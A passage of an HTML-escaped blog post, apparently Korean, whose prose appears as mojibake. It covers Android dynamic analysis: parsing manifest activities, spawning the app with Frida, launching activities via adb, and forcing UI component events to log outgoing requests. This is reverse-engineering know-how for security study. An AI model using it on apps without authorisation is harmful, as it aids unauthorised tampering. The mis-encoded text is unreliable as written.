    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Element&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;activity&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;intent_filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;intent-filter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;act_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attrib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;{{&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;tname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;act_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;act_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pitem&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;act_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pitem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;act_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;category&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pitem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;category&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;act_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pitem.findall(&quot;data&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;device&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frida&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_usb_device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ ì½”ë“œë¥¼ í™œìš©í•˜ë©´, &lt;code class=&quot;highlighter-rouge&quot;&gt;ExtraíŒŒë¼ë¯¸í„°ë¥¼ ì‚¬ìš©í•˜ì§€ì•ŠëŠ” Activityê°€ ë™ì‘&lt;/code&gt;í•˜ê²Œ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ, Activityì—ì„œ ì™¸ë¶€ë¡œ ìš”ì²­ì„ ì—¬ëŸ¬ë²ˆ í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì„ ê³ ë ¤í•˜ì—¬ ì–´ëŠ ì •ë„ì˜ ì‹œê°„ ì¡°ì ˆì´ í•„ìš”í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;2-adbë¥¼-í†µí•´-activity-ì „í™˜-ì‹œ-ë°œìƒí•˜ëŠ”-ì™¸ë¶€-ìš”ì²­-íŒ¨í‚·-ë¡œê¹…&quot;&gt;2. adbë¥¼ í†µí•´ Activity ì „í™˜ ì‹œ ë°œìƒí•˜ëŠ” ì™¸ë¶€ ìš”ì²­ íŒ¨í‚· ë¡œê¹…&lt;/h3&gt;

&lt;p&gt;adbëŠ” Android Device Bridgeì˜ ì•½ìë¡œ ê¸°ê¸°ì™€ í†µì‹ í•  ìˆ˜ ìˆëŠ” ë„êµ¬ì…ë‹ˆë‹¤. í•´ë‹¹ íˆ´ì—ì„œëŠ” ì—¬ëŸ¬ ê¸°ëŠ¥ì„ ì§€ì›í•˜ëŠ”ë°, intentë¥¼ íŠ¹ì • ì•±ì— ì „ì†¡, broadcast ë“±ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ëŠ” activity ì‹¤í–‰ì„ ìœ„í•œ adb ì˜µì…˜ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# activity ì‹¤í–‰í•˜ëŠ” adb ì»¤ë§¨ë“œ&lt;/span&gt;
adb shell am start &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;action&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;category&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;package&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;activity_name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•˜ì§€ë§Œ ìœ„ì˜ ëª…ë ì–´ëŠ” AndroidManifest.xmlì—ì„œ activity tagì˜ attributeê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;android:exported=true&lt;/code&gt; ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆì–´ì•¼ í•˜ë©°, í•´ë‹¹ ì˜µì…˜ì´ ì„¤ì •ë˜ì§€ ì•Šì„ ê²½ìš° ì•„ë˜ì™€ ê°™ì´ ì‹¤íŒ¨í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Sample AnroidManifest.xml --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;manifest&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:android=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/apk/res/android&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;package=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kr.nekop.testapp&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;application&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:allowBackup=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@mipmap/ic_launcher&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:label=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@string/app_name&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:roundIcon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@mipmap/ic_launcher_round&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:supportsRtl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:theme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@style/AppTheme&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;activity&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.TestActivity&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:exported=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/activity&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;activity&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.MainActivity&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:label=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@string/title_activity_main&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:theme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@style/AppTheme.NoActionBar&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/application&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/manifest&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/yo0700.png&quot; alt=&quot;/assets/yo0700.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-component-ì´ë²¤íŠ¸-ì²˜ë¦¬ì‹œ-ë°œìƒí•˜ëŠ”-ì™¸ë¶€-ìš”ì²­-íŒ¨í‚·-ë¡œê¹…&quot;&gt;3. Component ì´ë²¤íŠ¸ ì²˜ë¦¬ì‹œ ë°œìƒí•˜ëŠ” ì™¸ë¶€ ìš”ì²­ íŒ¨í‚· ë¡œê¹…&lt;/h3&gt;

&lt;p&gt;ActivityëŠ” ì—¬ëŸ¬ê°€ì§€ì˜ Componentë¡œ êµ¬ì„±ë©ë‹ˆë‹¤. Button, List, Layout ë“±ìœ¼ë¡œ ì—¬ëŸ¬ ê¸°ëŠ¥ë“¤ì„ ì‹œê°í™”í•´ì„œ ì‚¬ìš©ìê°€ ì ‘ê·¼ ë° ì‚¬ìš©í•˜ê¸° ì‰½ê²Œ ë§Œë“­ë‹ˆë‹¤. ë”°ë¼ì„œ, í•´ë‹¹ ê¸°ëŠ¥ë“¤ì€ Componentì— ì¢…ì†ì ìœ¼ë¡œ êµ¬í˜„ë˜ì–´ìˆìŠµë‹ˆë‹¤.  ê·¸ëŸ¬ë¯€ë¡œ Componentì˜ ì´ë²¤íŠ¸ë¥¼ ê°•ì œë¡œ ë°œìƒì‹œì¼œ ì—¬ëŸ¬ê°€ì§€ ê¸°ëŠ¥ë“¤ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë„ë¡ ë§Œë“¤ë©´ ë”ìš± ë§ì€ ì™¸ë¶€ ìš”ì²­ì„ í•  ìˆ˜ ìˆì„ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤. Layoutì„ í™•ì¸í•˜ê¸° ìœ„í•´ì„œëŠ” ë””ì»´íŒŒì¼ ì´í›„, resource í´ë” ë‚´ì˜ layoutì„ í™•ì¸í•˜ë©´ ë©ë‹ˆë‹¤. ì•„ë˜ëŠ” ê·¸ ì˜ˆì‹œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- sample layout.xml --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;androidx.coordinatorlayout.widget.CoordinatorLayout&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:android=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/apk/res/android&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;xmlns:app=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/apk/res-auto&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;xmlns:tools=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/tools&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;tools:context=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.MainActivity&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;com.google.android.material.appbar.AppBarLayout&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:theme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@style/AppTheme.AppBarOverlay&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;nt&quot;&gt;&amp;lt;androidx.appcompat.widget.Toolbar&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@+id/toolbar&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;?attr/actionBarSize&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:background=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;?attr/colorPrimary&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;app:popupTheme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@style/AppTheme.PopupOverlay&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;nt&quot;&gt;&amp;lt;TextView&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@+id/textView&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:text=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MainActivity!!!&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Button&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@+id/button&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:text=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Button&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/com.google.android.material.appbar.AppBarLayout&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;include&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;layout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@layout/content_main&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;com.google.android.material.floatingactionbutton.FloatingActionButton&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@+id/fab&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:layout_gravity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bottom|end&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:layout_margin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@dimen/fab_margin&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;app:srcCompat=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@android:drawable/ic_dialog_email&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/androidx.coordinatorlayout.widget.CoordinatorLayout&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ xmlíŒŒì¼ì„ íŒŒì‹±í•œ ì´í›„, frida scriptë¡œ ì „ë‹¬í•´ì„œ component íƒ€ì…ë³„ë¡œ ì´ë²¤íŠ¸ë¥¼ ê°•ì œë¡œ ë°œìƒí•˜ë„ë¡ ì•„ë˜ì™€ ê°™ì´ ì½”ë“œë¥¼ ì‘ì„±í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActivityThread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;android.app.ActivityThread&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActivityThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;currentApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getApplicationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

